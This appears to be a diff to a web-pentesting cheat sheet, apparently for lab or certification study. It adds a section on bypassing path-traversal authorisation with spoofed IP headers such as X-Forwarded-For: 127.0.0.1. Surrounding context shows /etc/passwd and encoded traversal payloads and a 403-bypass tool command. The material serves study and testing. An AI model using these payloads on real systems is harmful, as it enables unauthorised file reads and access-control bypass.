@@ -2541,6 +2541,12 @@ wrtz{{#with "s" as |string|}}
   
 ## File Path Traversal
 
+[LFI Attacks](#lfi-attacks)  
+[Admin Portal Files](#admin-portal-files)  
+[Path Traversal Authz](#path-traversal-authz)  
+  
+### LFI attacks  
+
 >Directory traversal attacks allow the malicious actor to read file on the server. ***Identify*** web parameters such as ```filename=``` that are requesting files.  
 
 1. Application blocks traversal sequences but treats the supplied filename as being relative to a absolute path and can be exploit with ```/etc/passwd```absolute path to target file payload.  
@@ -2585,6 +2591,34 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
 ```
 python3 403bypasser.py -u https://TARGET.net -d /secret
 ```
+
+### Path Traversal Authz  
+
+>Adding Headers in request with value `127.0.0.1` or `localhost` can also help in bypassing restrictions.  
+
+```html
+X-Custom-IP-Authorization
+X-Forwarded-For
+X-Forward-For
+X-Remote-IP
+X-Client-IP
+X-Real-IP
+
+X-Originating-IP: 127.0.0.1
+X-Forwarded: 127.0.0.1
+Forwarded-For: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+X-Original-URL: 127.0.0.1
+Client-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+Cluster-Client-IP: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+
+Host: localhost
+```  
+
+[HackTricks Bypass 403 Forbidden paths](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses)  
 
 ## File Uploads  
   
